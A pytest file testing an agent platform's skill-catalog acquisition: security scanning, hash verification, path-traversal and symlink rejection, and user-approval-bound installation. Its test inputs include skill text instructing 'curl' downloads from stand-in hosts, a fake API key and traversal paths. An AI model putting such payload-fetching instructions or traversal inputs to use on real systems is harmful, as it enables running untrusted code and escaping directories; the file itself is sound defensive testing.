"""Security, provider, approval, and atomic-install tests for skill acquisition."""

from __future__ import annotations

import asyncio
import hashlib
import json
import subprocess
from pathlib import Path

import httpx
import pytest

from atlas.agent.capabilities import AgentCapabilityRegistry, register_skill_catalog_capabilities
from atlas.skills import SkillManager
from atlas.skills.acquisition import (
    MAX_FILES,
    CatalogUnavailableError,
    SkillsShProvider,
    _provider_reference_sha256,
    inspect_github_source,
    install_acquisition,
    payload_sha256,
    prepare_acquisition,
)
from atlas.skills.registry import SkillRegistry

SKILL = (
    "---\nname: sample-skill\nversion: 1.2.3\ndescription: A sample skill\n"
    "dependencies: []\n---\nSafe guidance.\n"
)


def _record(**extra):
    return {
        "provider": "skills.sh",
        "external_id": "owner/repo/sample-skill",
        "name": "sample-skill",
        "source_url": "https://github.com/owner/repo",
        "remote_hash": None,
        **extra,
    }


def test_security_gate_pass_warn_block_and_hash_mismatch():
    assert prepare_acquisition(_record(), {"SKILL.md": SKILL}).security["result"] == "PASS"
    warned = prepare_acquisition(_record(), {"SKILL.md": SKILL + "Run curl https://bad.example/x"})
    assert warned.security["result"] == "WARN"
    blocked = prepare_acquisition(_record(), {"SKILL.md": SKILL + "api_key=sk-abcdefghijklmnop"})
    assert blocked.security["result"] == "BLOCK"
    mismatch = prepare_acquisition(_record(remote_hash="0" * 64), {"SKILL.md": SKILL})
    assert mismatch.security["result"] == "BLOCK"
    assert "remote_hash_mismatch" in mismatch.security["risks"]


def test_skills_sh_snapshot_hash_includes_sorted_relative_paths():
    single = hashlib.sha256(b"SKILL.md" + SKILL.encode("utf-8")).hexdigest()
    assert prepare_acquisition(_record(), {"SKILL.md": SKILL}).computed_hash == single
    files = {"SKILL.md": SKILL, "a.txt": "note"}
    expected = hashlib.sha256(b"a.txt" + b"note" + b"SKILL.md" + SKILL.encode("utf-8")).hexdigest()
    acquisition = prepare_acquisition(_record(), files)
    assert acquisition.computed_hash == expected
    assert payload_sha256(files) != hashlib.sha256(("note" + SKILL).encode()).hexdigest()


def test_provider_reference_hash_matches_node_generated_mixed_path_fixture():
    fixture = json.loads(
        (Path(__file__).parent / "fixtures" / "provider_hash_reference.json").read_text("utf-8")
    )
    locale = subprocess.run(
        ["node", "-p", "Intl.Collator().resolvedOptions().locale"],
        check=True,
        capture_output=True,
        text=True,
        timeout=5,
    ).stdout.strip()
    assert locale in fixture["reference_sha256_by_locale"]
    expected = fixture["reference_sha256_by_locale"][locale]
    assert _provider_reference_sha256(fixture["files"]) == expected
    assert payload_sha256(fixture["files"]) == fixture["atlas_local_sha256"]
    assert expected != fixture["atlas_local_sha256"]
    assert (
        fixture["reference_sha256_by_locale"]["sv-SE"]
        != fixture["reference_sha256_by_locale"]["en-US"]
    )


def test_missing_manifest_version_normalizes_and_malformed_version_rejects():
    versionless = SKILL.replace("version: 1.2.3\n", "")
    acquisition = prepare_acquisition(_record(), {"SKILL.md": versionless})
    assert acquisition.record["version"] == "0.0.0"
    with pytest.raises(ValueError, match="manifest version"):
        prepare_acquisition(
            _record(),
            {
                "SKILL.md": versionless.replace(
                    "name: sample-skill", "name: sample-skill\nversion: nope"
                )
            },
        )


@pytest.mark.parametrize("path", ["../escape", "/absolute", "C:/escape", "a\\b"])
def test_payload_path_attacks_are_rejected(path):
    with pytest.raises(ValueError, match="unsafe payload path"):
        prepare_acquisition(_record(), {"SKILL.md": SKILL, path: "x"})


def test_manifest_secret_and_oversized_payload_are_rejected():
    with pytest.raises(ValueError, match="credential"):
        secret_manifest = SKILL.replace("dependencies: []", "token: hello")
        prepare_acquisition(_record(), {"SKILL.md": secret_manifest})
    with pytest.raises(ValueError, match="size limit"):
        prepare_acquisition(_record(), {"SKILL.md": SKILL, "large.txt": "x" * 512_001})
    with pytest.raises(ValueError, match="file count"):
        prepare_acquisition(
            _record(),
            {"SKILL.md": SKILL, **{f"{i}.md": "x" for i in range(MAX_FILES)}},
        )


@pytest.mark.asyncio
async def test_direct_github_source_rejects_local_urls_and_path_traversal():
    with pytest.raises(ValueError, match="https://github.com"):
        await inspect_github_source("file:///tmp/SKILL.md")
    with pytest.raises(ValueError, match="unsafe GitHub skill path"):
        await inspect_github_source("https://github.com/owner/repo", "../secret")


@pytest.mark.asyncio
async def test_public_github_repository_and_skill_path_fetch_manifest_and_support_files():
    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.host == "api.github.com" and request.url.path == "/repos/owner/repo":
            return httpx.Response(200, json={"default_branch": "main"})
        if request.url.host == "api.github.com" and "/commits/" in request.url.path:
            return httpx.Response(
                200, json={"sha": "a" * 40, "commit": {"tree": {"sha": "b" * 40}}}
            )
        if request.url.host == "api.github.com" and "/git/trees/" in request.url.path:
            return httpx.Response(
                200,
                json={
                    "sha": "b" * 40,
                    "tree": [
                        {
                            "path": "skills/sample-skill/SKILL.md",
                            "type": "blob",
                            "mode": "100644",
                            "size": len(SKILL),
                        },
                        {
                            "path": "skills/sample-skill/notes.md",
                            "type": "blob",
                            "mode": "100644",
                            "size": 4,
                        },
                        {"path": "other/SKILL.md", "type": "blob", "mode": "100644", "size": 3},
                    ],
                    "truncated": False,
                },
            )
        if request.url.host == "raw.githubusercontent.com":
            content = SKILL if request.url.path.endswith("SKILL.md") else "note"
            return httpx.Response(200, text=content)
        return httpx.Response(404)

    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as client:
        acquisition = await inspect_github_source(
            "https://github.com/owner/repo",
            "skills/sample-skill",
            client=client,
        )
    assert acquisition.record["provider"] == "github"
    assert set(acquisition.files) == {"SKILL.md", "notes.md"}
    assert acquisition.validation["result"] == "PASS"
    assert acquisition.record["github_source_revision"] == "a" * 40
    assert acquisition.record["github_tree_sha"] == "b" * 40


@pytest.mark.asyncio
async def test_github_source_resolves_provider_slug_from_skill_manifest_name():
    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.path == "/repos/owner/repo":
            return httpx.Response(200, json={"default_branch": "main"})
        if "/commits/" in request.url.path:
            return httpx.Response(
                200, json={"sha": "a" * 40, "commit": {"tree": {"sha": "b" * 40}}}
            )
        if "/git/trees/" in request.url.path:
            return httpx.Response(
                200,
                json={
                    "sha": "b" * 40,
                    "truncated": False,
                    "tree": [
                        {
                            "path": "skills/react-best-practices/SKILL.md",
                            "type": "blob",
                            "mode": "100644",
                            "size": len(SKILL),
                        },
                        {
                            "path": "skills/react-best-practices/notes.md",
                            "type": "blob",
                            "mode": "100644",
                            "size": 4,
                        },
                    ],
                },
            )
        if request.url.host == "raw.githubusercontent.com":
            content = SKILL if request.url.path.endswith("SKILL.md") else "note"
            return httpx.Response(200, content=content.encode("utf-8"))
        return httpx.Response(404)

    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as client:
        acquisition = await inspect_github_source(
            "https://github.com/owner/repo",
            expected_name="sample-skill",
            client=client,
        )

    assert acquisition.record["external_id"] == "owner/repo/skills/react-best-practices"
    assert acquisition.record["github_source_revision"] == "a" * 40
    assert acquisition.record["github_tree_sha"] == "b" * 40
    assert set(acquisition.files) == {"SKILL.md", "notes.md"}


@pytest.mark.asyncio
async def test_public_github_symlink_is_rejected_before_file_download():
    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.path == "/repos/owner/repo":
            return httpx.Response(200, json={"default_branch": "main"})
        if "/commits/" in request.url.path:
            return httpx.Response(
                200, json={"sha": "a" * 40, "commit": {"tree": {"sha": "b" * 40}}}
            )
        return httpx.Response(
            200,
            json={
                "sha": "b" * 40,
                "tree": [
                    {
                        "path": "skills/sample-skill/SKILL.md",
                        "type": "blob",
                        "mode": "100644",
                        "size": len(SKILL),
                    },
                    {
                        "path": "skills/sample-skill/outside",
                        "type": "blob",
                        "mode": "120000",
                        "size": 10,
                    },
                ]
            },
        )

    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as client:
        with pytest.raises(ValueError, match="symlink"):
            await inspect_github_source(
                "https://github.com/owner/repo",
                "skills/sample-skill",
                client=client,
            )


@pytest.mark.asyncio
async def test_public_github_truncated_tree_is_rejected():
    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.path == "/repos/owner/repo":
            return httpx.Response(200, json={"default_branch": "main"})
        if "/commits/" in request.url.path:
            return httpx.Response(
                200, json={"sha": "a" * 40, "commit": {"tree": {"sha": "b" * 40}}}
            )
        return httpx.Response(
            200,
            json={
                "sha": "b" * 40,
                "tree": [{"path": "skills/sample-skill/SKILL.md"}],
                "truncated": True,
            },
        )

    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as client:
        with pytest.raises(CatalogUnavailableError, match="incomplete.*truncated"):
            await inspect_github_source(
                "https://github.com/owner/repo",
                "skills/sample-skill",
                client=client,
            )


@pytest.mark.asyncio
async def test_public_search_normalizes_results_and_provider_failures_are_explicit():
    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.path == "/api/search":
            return httpx.Response(
                200,
                json={
                    "skills": [
                        {
                            "id": "owner/repo/sample-skill",
                            "name": "Sample Skill",
                            "source": "owner/repo",
                            "installs": 4,
                        }
                    ]
                },
            )
        return httpx.Response(503)

    client = httpx.AsyncClient(transport=httpx.MockTransport(handler))
    provider = SkillsShProvider(client)
    result = await provider.search("sample")
    assert result["status"] == "available"
    assert result["results"][0]["state"] == "remote"
    assert result["results"][0]["provider"] == "skills.sh"
    with pytest.raises(CatalogUnavailableError, match="unavailable"):
        await provider.get_detail("owner/repo/sample-skill")
    await client.aclose()


@pytest.mark.asyncio
async def test_skills_sh_detail_normalizes_payload_hash_and_optional_audit():
    remote_hash = hashlib.sha256(
        b"notes.mdnoteSKILL.md" + SKILL.encode("utf-8")
    ).hexdigest()

    def handler(request: httpx.Request) -> httpx.Response:
        if "/audit/" in request.url.path:
            return httpx.Response(404)
        return httpx.Response(
            200,
            json={
                "id": "owner/repo/sample-skill",
                "source": "owner/repo",
                "slug": "sample-skill",
                "hash": remote_hash,
                "files": [
                    {"path": "SKILL.md", "contents": SKILL},
                    {"path": "notes.md", "contents": "note"},
                ],
            },
        )

    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as client:
        acquisition = await SkillsShProvider(client).inspect("owner/repo/sample-skill")
    assert acquisition.record["provider"] == "skills.sh"
    assert acquisition.record["remote_hash"] == remote_hash
    assert acquisition.record["audit"] is None
    assert acquisition.computed_hash == remote_hash
    assert len(acquisition.files) == 2
    assert acquisition.security["result"] == "PASS"


def _provider_github_handler(
    snapshot_files,
    github_files=None,
    *,
    provider_hash="0" * 64,
    github_status=200,
    github_truncated=False,
):
    github_files = github_files if github_files is not None else snapshot_files

    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.host == "skills.sh" and request.url.path.startswith("/api/download/"):
            return httpx.Response(
                200,
                json={"hash": provider_hash, "files": [
                    {"path": path, "contents": content}
                    for path, content in snapshot_files.items()
                ]},
            )
        if request.url.host == "skills.sh" and "/audit/" in request.url.path:
            return httpx.Response(404)
        if request.url.host == "api.github.com" and request.url.path == "/repos/owner/repo":
            if github_status != 200:
                return httpx.Response(github_status)
            return httpx.Response(200, json={"default_branch": "main"})
        if request.url.host == "api.github.com" and "/commits/" in request.url.path:
            return httpx.Response(
                200, json={"sha": "a" * 40, "commit": {"tree": {"sha": "b" * 40}}}
            )
        if request.url.host == "api.github.com" and "/git/trees/" in request.url.path:
            return httpx.Response(200, json={
                "sha": "b" * 40,
                "truncated": github_truncated,
                "tree": [
                    {
                        "path": f"skills/sample-skill/{path}",
                        "type": "blob",
                        "mode": "100644",
                        "size": len(content),
                    }
                    for path, content in github_files.items()
                ],
            })
        if request.url.host == "raw.githubusercontent.com":
            relative = request.url.path.split("/skills/sample-skill/", 1)[-1]
            if relative not in github_files:
                return httpx.Response(404)
            return httpx.Response(200, content=github_files[relative].encode("utf-8"))
        return httpx.Response(404)

    return handler


@pytest.mark.asyncio
async def test_provider_mismatch_identical_github_source_uses_verified_fallback():
    files = {"SKILL.md": SKILL, "notes.md": "same note"}
    async with httpx.AsyncClient(
        transport=httpx.MockTransport(_provider_github_handler(files))
    ) as client:
        acquisition = await SkillsShProvider(client).inspect("owner/repo/sample-skill")

    assert acquisition.files == files
    assert acquisition.security["result"] == "PASS"
    assert acquisition.record["provider"] == "skills.sh"
    assert acquisition.record["remote_hash"] == "0" * 64
    integrity = acquisition.record["provider_integrity"]
    assert integrity["provider_mismatch"] is True
    assert integrity["provider_computed_hash"] != integrity["provider_hash"]
    assert integrity["source_match"] is True
    assert integrity["github_source_revision"] == "a" * 40
    assert integrity["github_tree_sha"] == "b" * 40
    assert acquisition.record["source_url"].endswith(
        f"/tree/{'a' * 40}/skills/sample-skill"
    )


@pytest.mark.asyncio
async def test_provider_mismatch_different_github_source_is_blocked():
    files = {"SKILL.md": SKILL, "notes.md": "catalog note"}
    source_files = {"SKILL.md": SKILL, "notes.md": "current source note"}
    async with httpx.AsyncClient(
        transport=httpx.MockTransport(_provider_github_handler(files, source_files))
    ) as client:
        acquisition = await SkillsShProvider(client).inspect("owner/repo/sample-skill")

    assert acquisition.security["result"] == "BLOCK"
    assert "catalog_source_mismatch" in acquisition.security["risks"]
    assert acquisition.record["integrity_diagnostic"]["status"] == "catalog_source_mismatch"
    assert acquisition.record["integrity_diagnostic"]["source_match"] is False


@pytest.mark.asyncio
async def test_provider_mismatch_unavailable_github_source_is_blocked():
    files = {"SKILL.md": SKILL, "notes.md": "catalog note"}
    async with httpx.AsyncClient(
        transport=httpx.MockTransport(
            _provider_github_handler(files, github_status=503)
        )
    ) as client:
        acquisition = await SkillsShProvider(client).inspect("owner/repo/sample-skill")

    assert acquisition.security["result"] == "BLOCK"
    assert "github_source_unavailable" in acquisition.security["risks"]
    assert acquisition.record["integrity_diagnostic"]["status"] == "github_source_unavailable"


@pytest.mark.asyncio
async def test_provider_mismatch_truncated_github_tree_remains_blocked():
    files = {"SKILL.md": SKILL, "notes.md": "catalog note"}
    async with httpx.AsyncClient(
        transport=httpx.MockTransport(
            _provider_github_handler(files, github_truncated=True)
        )
    ) as client:
        acquisition = await SkillsShProvider(client).inspect("owner/repo/sample-skill")

    assert acquisition.security["result"] == "BLOCK"
    assert "github_source_unavailable" in acquisition.security["risks"]
    assert "truncated" in acquisition.record["integrity_diagnostic"]["github_source_error"]


@pytest.mark.asyncio
async def test_provider_reference_hash_match_uses_normal_approved_install(tmp_path, monkeypatch):
    from httpx import ASGITransport, AsyncClient

    from atlas import server
    from atlas.server import app

    files = {"SKILL.md": SKILL, "notes.md": "healthy provider note"}
    expected = _provider_reference_sha256(files)
    provider = SkillsShProvider(
        httpx.AsyncClient(
            transport=httpx.MockTransport(
                _provider_github_handler(files, provider_hash=expected)
            )
        )
    )
    registry = SkillRegistry(tmp_path / "registry.db")
    monkeypatch.setattr(server, "skill_registry", registry)
    monkeypatch.setattr(server, "skill_mgr", SkillManager(tmp_path / "skills"))
    monkeypatch.setattr(server, "skill_catalog_provider", provider)
    server.skill_acquisitions.clear()
    try:
        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
            preview_response = await client.post(
                "/api/skill-catalog/inspect",
                json={"external_id": "owner/repo/sample-skill"},
            )
            preview = preview_response.json()
            approval_response = await client.post(
                "/api/skill-catalog/approve",
                json={"acquisition_id": preview["acquisition_id"]},
            )
            installed_response = await client.post(
                "/api/skill-catalog/install",
                json={
                    "acquisition_id": preview["acquisition_id"],
                    "install_authorization": approval_response.json()["install_authorization"],
                },
            )
    finally:
        await provider._client.aclose()
        server.skill_acquisitions.clear()

    assert preview_response.status_code == 200
    assert preview["security"]["result"] == "PASS"
    assert preview["record"].get("provider_integrity") is None
    assert preview["record"]["provider_computed_hash"] == expected
    assert approval_response.status_code == 200
    assert installed_response.status_code == 200
    provenance = registry.get("sample-skill", "1.2.3")["provenance"]
    assert provenance["provider_computed_hash"] == expected
    assert provenance.get("provider_integrity") is None


@pytest.mark.asyncio
async def test_fallback_requires_fresh_warn_approval_and_records_provenance(tmp_path, monkeypatch):
    from httpx import ASGITransport, AsyncClient

    from atlas import server
    from atlas.server import app

    files = {
        "SKILL.md": SKILL + "Run curl https://example.invalid/payload",
        "notes.md": "source note",
    }
    provider = SkillsShProvider(
        httpx.AsyncClient(transport=httpx.MockTransport(_provider_github_handler(files)))
    )
    registry = SkillRegistry(tmp_path / "registry.db")
    monkeypatch.setattr(server, "skill_registry", registry)
    monkeypatch.setattr(server, "skill_mgr", SkillManager(tmp_path / "skills"))
    monkeypatch.setattr(server, "skill_catalog_provider", provider)
    server.skill_acquisitions.clear()
    try:
        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
            first = (await client.post(
                "/api/skill-catalog/inspect", json={"external_id": "owner/repo/sample-skill"}
            )).json()
            second = (await client.post(
                "/api/skill-catalog/inspect", json={"external_id": "owner/repo/sample-skill"}
            )).json()
            no_confirmation = await client.post(
                "/api/skill-catalog/approve",
                json={"acquisition_id": second["acquisition_id"], "warnings_confirmed": False},
            )
            approval = await client.post(
                "/api/skill-catalog/approve",
                json={"acquisition_id": second["acquisition_id"], "warnings_confirmed": True},
            )
            authorization = approval.json()["install_authorization"]
            stale_reuse = await client.post(
                "/api/skill-catalog/install",
                json={
                    "acquisition_id": first["acquisition_id"],
                    "install_authorization": authorization,
                },
            )
            installed = await client.post(
                "/api/skill-catalog/install",
                json={
                    "acquisition_id": second["acquisition_id"],
                    "install_authorization": authorization,
                },
            )
    finally:
        await provider._client.aclose()
        server.skill_acquisitions.clear()

    assert first["acquisition_id"] != second["acquisition_id"]
    assert second["security"]["result"] == "WARN"
    assert second["record"]["integrity_diagnostic"]["status"] == "github_fallback"
    assert no_confirmation.status_code == 403
    assert approval.status_code == 200
    assert stale_reuse.status_code == 403
    assert installed.status_code == 200
    stored = registry.get("sample-skill", "1.2.3")
    provenance = stored["provenance"]
    assert provenance["provider_integrity"]["provider_mismatch"] is True
    assert provenance["provider_computed_hash"] == provenance[
        "provider_integrity"
    ]["provider_computed_hash"]
    assert provenance["provider_integrity"]["github_source"].endswith(
        f"/tree/{'a' * 40}/skills/sample-skill"
    )
    assert provenance["provider_integrity"]["github_tree_sha"] == "b" * 40
    assert provenance["computed_sha256"] == installed.json()["hash"]
    assert provenance["remote_hash"] == "0" * 64


@pytest.mark.asyncio
async def test_install_requires_approval_scans_into_discovery_and_persists_provenance(tmp_path):
    registry = SkillRegistry(tmp_path / "registry.db")
    acquisition = prepare_acquisition(_record(), {"SKILL.md": SKILL})
    with pytest.raises(PermissionError, match="approval"):
        await install_acquisition(
            acquisition, skills_dir=tmp_path / "skills", registry=registry, approval_event={}
        )
    assert registry.list() == []
    result = await install_acquisition(
        acquisition,
        skills_dir=tmp_path / "skills",
        registry=registry,
        approval_event={
            "approval_event_id": "server-approved-1",
            "approved_at": "2026-01-01T00:00:00+00:00",
            "computed_sha256": acquisition.computed_hash,
        },
    )
    stored = registry.get("sample-skill", "1.2.3")
    assert result["status"] == "installed"
    assert stored["provenance"]["user_approval_event_id"] == "server-approved-1"
    assert stored["provenance"]["computed_sha256"] == acquisition.computed_hash
    from atlas.skills import SkillManager

    manager = SkillManager(skills_dir=tmp_path / "skills")
    manager.scan_skills_sync()
    assert manager.get_skill("sample-skill") is not None


@pytest.mark.asyncio
async def test_conflict_is_not_overwritten_and_agent_has_no_install_capability(tmp_path):
    registry = SkillRegistry(tmp_path / "conflicts.db")
    registry.register(
        {"name": "sample-skill", "version": "1.2.3", "description": "Existing"}, source="local"
    )
    acquisition = prepare_acquisition(_record(), {"SKILL.md": SKILL})
    with pytest.raises(FileExistsError):
        await install_acquisition(
            acquisition,
            skills_dir=tmp_path / "unused",
            registry=registry,
            approval_event={
                "approval_event_id": "ok",
                "approved_at": "now",
                "computed_sha256": acquisition.computed_hash,
            },
        )
    assert registry.get("sample-skill", "1.2.3")["description"] == "Existing"
    capabilities = AgentCapabilityRegistry()
    register_skill_catalog_capabilities(capabilities, SkillsShProvider())
    assert {item["name"] for item in capabilities.discover()} == {
        "skill.catalog.search",
        "skill.catalog.inspect",
        "skill.catalog.install",
    }
    with pytest.raises(PermissionError, match="explicit Skill Center"):
        await capabilities.invoke("skill.catalog.install", {"approved": True})
    with pytest.raises((KeyError, ValueError)):
        await capabilities.invoke("skill.catalog.approve", {"acquisition_id": "anything"})


@pytest.mark.asyncio
async def test_concurrent_duplicate_install_keeps_existing_registry_and_directory(tmp_path):
    registry = SkillRegistry(tmp_path / "concurrent.db")
    skills_dir = tmp_path / "skills"
    acquisition = prepare_acquisition(_record(), {"SKILL.md": SKILL})

    def approval(suffix):
        return {
            "approval_event_id": f"server-{suffix}",
            "approved_at": "2026-01-01T00:00:00+00:00",
            "computed_sha256": acquisition.computed_hash,
        }

    results = await asyncio.gather(
        install_acquisition(
            acquisition, skills_dir=skills_dir, registry=registry, approval_event=approval("one")
        ),
        install_acquisition(
            acquisition, skills_dir=skills_dir, registry=registry, approval_event=approval("two")
        ),
        return_exceptions=True,
    )
    assert (
        sum(isinstance(result, dict) and result.get("status") == "installed" for result in results)
        == 1
    )
    assert sum(isinstance(result, FileExistsError) for result in results) == 1
    stored = registry.get("sample-skill", "1.2.3")
    assert stored["provenance"]["user_approval_event_id"] in {"server-one", "server-two"}
    assert (skills_dir / "community" / "sample-skill" / "SKILL.md").read_text("utf-8") == SKILL


@pytest.mark.asyncio
async def test_registry_failure_rolls_back_installed_directory_and_cleans_stage(tmp_path):
    class FailingRegistry(SkillRegistry):
        def register(self, metadata, *, source="api"):
            raise RuntimeError("registry unavailable")

    skills_dir = tmp_path / "skills"
    acquisition = prepare_acquisition(_record(), {"SKILL.md": SKILL})
    with pytest.raises(RuntimeError, match="registry unavailable"):
        await install_acquisition(
            acquisition,
            skills_dir=skills_dir,
            registry=FailingRegistry(tmp_path / "fail.db"),
            approval_event={
                "approval_event_id": "approved",
                "approved_at": "now",
                "computed_sha256": acquisition.computed_hash,
            },
        )
    assert not (skills_dir / "community" / "sample-skill").exists()
    assert not (tmp_path / ".atlas-skill-staging").exists()


def test_payload_sha256_is_stable():
    first = prepare_acquisition(_record(), {"SKILL.md": SKILL, "notes.md": "note"})
    second = prepare_acquisition(_record(), {"notes.md": "note", "SKILL.md": SKILL})
    assert first.computed_hash == second.computed_hash
    assert len(first.computed_hash) == hashlib.sha256().digest_size * 2


@pytest.mark.asyncio
async def test_catalog_api_keeps_preview_read_only_and_requires_warn_confirmation(
    tmp_path,
    monkeypatch,
):
    from httpx import ASGITransport, AsyncClient

    from atlas import server
    from atlas.server import app

    acquisition = prepare_acquisition(
        _record(),
        {"SKILL.md": SKILL + "Run curl https://example.invalid/payload"},
    )

    class Provider:
        async def search(self, query, *, page=0):
            return {
                "provider": "skills.sh",
                "results": [{"external_id": "id"}],
                "status": "available",
            }

        async def inspect(self, external_id):
            return acquisition

    registry = SkillRegistry(tmp_path / "registry.db")
    monkeypatch.setattr(server, "skill_registry", registry)
    monkeypatch.setattr(server, "skill_mgr", SkillManager(tmp_path / "skills"))
    monkeypatch.setattr(server, "skill_catalog_provider", Provider())
    server.skill_acquisitions.clear()
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        search = await client.get("/api/skill-catalog/search?q=sample")
        preview = await client.post("/api/skill-catalog/inspect", json={"external_id": "id"})
        assert registry.list() == []
        acquisition_id = preview.json()["acquisition_id"]
        denied = await client.post(
            "/api/skill-catalog/install",
            json={"acquisition_id": acquisition_id},
        )
        arbitrary = await client.post(
            "/api/skill-catalog/install",
            json={
                "acquisition_id": acquisition_id,
                "approved": True,
                "approval_event_id": "client-generated",
            },
        )
        no_warn = await client.post(
            "/api/skill-catalog/approve",
            json={
                "acquisition_id": acquisition_id,
                "warnings_confirmed": False,
            },
        )
        approval_response = await client.post(
            "/api/skill-catalog/approve",
            json={"acquisition_id": acquisition_id, "warnings_confirmed": True},
        )
        approval = approval_response.json()
        installed = await client.post(
            "/api/skill-catalog/install",
            json={
                "acquisition_id": acquisition_id,
                "install_authorization": approval["install_authorization"],
            },
        )
        replay = await client.post(
            "/api/skill-catalog/install",
            json={
                "acquisition_id": acquisition_id,
                "install_authorization": approval["install_authorization"],
            },
        )
    assert search.json()["status"] == "available"
    assert preview.json()["security"]["result"] == "WARN"
    assert denied.status_code == 403 and arbitrary.status_code == 403
    assert no_warn.status_code == 403
    assert approval["approval_event_id"] != "client-generated"
    assert approval["approval_state"] == "approved"
    assert approval["computed_sha256"] == acquisition.computed_hash
    assert installed.status_code == 200
    assert replay.status_code == 404
    stored = registry.get("sample-skill", "1.2.3")
    assert stored["provenance"]["user_approval_event_id"] == approval["approval_event_id"]
    assert stored["provenance"]["user_approval_timestamp"] == approval["approved_at"]
    server.skill_acquisitions.clear()


@pytest.mark.asyncio
async def test_catalog_approval_is_acquisition_hash_and_expiry_bound(tmp_path, monkeypatch):
    from datetime import UTC, datetime, timedelta

    from httpx import ASGITransport, AsyncClient

    from atlas import server
    from atlas.server import app

    class Provider:
        async def inspect(self, external_id):
            return prepare_acquisition(_record(), {"SKILL.md": SKILL})

    monkeypatch.setattr(server, "skill_registry", SkillRegistry(tmp_path / "registry.db"))
    monkeypatch.setattr(server, "skill_mgr", SkillManager(tmp_path / "skills"))
    monkeypatch.setattr(server, "skill_catalog_provider", Provider())
    server.skill_acquisitions.clear()
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        first = (await client.post("/api/skill-catalog/inspect", json={"external_id": "id"})).json()
        second = (
            await client.post("/api/skill-catalog/inspect", json={"external_id": "id"})
        ).json()
        third = (await client.post("/api/skill-catalog/inspect", json={"external_id": "id"})).json()
        approval = (
            await client.post(
                "/api/skill-catalog/approve",
                json={"acquisition_id": first["acquisition_id"]},
            )
        ).json()
        cross_acquisition = await client.post(
            "/api/skill-catalog/install",
            json={
                "acquisition_id": second["acquisition_id"],
                "install_authorization": approval["install_authorization"],
            },
        )
        server.skill_acquisitions[first["acquisition_id"]]["acquisition"].computed_hash = "0" * 64
        changed_hash = await client.post(
            "/api/skill-catalog/install",
            json={
                "acquisition_id": first["acquisition_id"],
                "install_authorization": approval["install_authorization"],
            },
        )
        server.skill_acquisitions[second["acquisition_id"]]["expires_at"] = datetime.now(
            UTC
        ) - timedelta(seconds=1)
        expired = await client.post(
            "/api/skill-catalog/approve",
            json={"acquisition_id": second["acquisition_id"]},
        )
        third_approval = (
            await client.post(
                "/api/skill-catalog/approve",
                json={"acquisition_id": third["acquisition_id"]},
            )
        ).json()
        server.skill_acquisitions[third["acquisition_id"]]["approval_expires_at"] = datetime.now(
            UTC
        ) - timedelta(seconds=1)
        expired_approval = await client.post(
            "/api/skill-catalog/install",
            json={
                "acquisition_id": third["acquisition_id"],
                "install_authorization": third_approval["install_authorization"],
            },
        )
    assert cross_acquisition.status_code == 403
    assert changed_hash.status_code == 409
    assert expired.status_code == 410
    assert expired_approval.status_code == 403
    server.skill_acquisitions.clear()


@pytest.mark.asyncio
async def test_blocked_catalog_skill_cannot_receive_server_approval(tmp_path, monkeypatch):
    from httpx import ASGITransport, AsyncClient

    from atlas import server
    from atlas.server import app

    blocked = prepare_acquisition(
        _record(),
        {"SKILL.md": SKILL + "api_key=sk-abcdefghijklmnop"},
    )

    class Provider:
        async def inspect(self, external_id):
            return blocked

    monkeypatch.setattr(server, "skill_registry", SkillRegistry(tmp_path / "registry.db"))
    monkeypatch.setattr(server, "skill_catalog_provider", Provider())
    server.skill_acquisitions.clear()
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        preview = await client.post("/api/skill-catalog/inspect", json={"external_id": "id"})
        approved = await client.post(
            "/api/skill-catalog/approve",
            json={"acquisition_id": preview.json()["acquisition_id"], "warnings_confirmed": True},
        )
    assert preview.json()["security"]["result"] == "BLOCK"
    assert approved.status_code == 403
    server.skill_acquisitions.clear()


@pytest.mark.asyncio
async def test_catalog_unavailable_state_does_not_change_local_registry(tmp_path, monkeypatch):
    from httpx import ASGITransport, AsyncClient

    from atlas import server
    from atlas.server import app

    class Provider:
        async def search(self, query, *, page=0):
            raise CatalogUnavailableError("external-catalog-unavailable: rate limited")

    registry = SkillRegistry(tmp_path / "registry.db")
    registry.register(
        {"name": "local-skill", "version": "1.0.0", "description": "Offline skill"},
        source="local",
    )
    monkeypatch.setattr(server, "skill_registry", registry)
    monkeypatch.setattr(server, "skill_catalog_provider", Provider())
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        remote = await client.get("/api/skill-catalog/search?q=sample")
        local = await client.get("/api/skills/discover?q=local")
    assert remote.json()["status"] == "external-catalog-unavailable"
    assert local.status_code == 200
    assert local.json()["results"][0]["name"] == "local-skill"
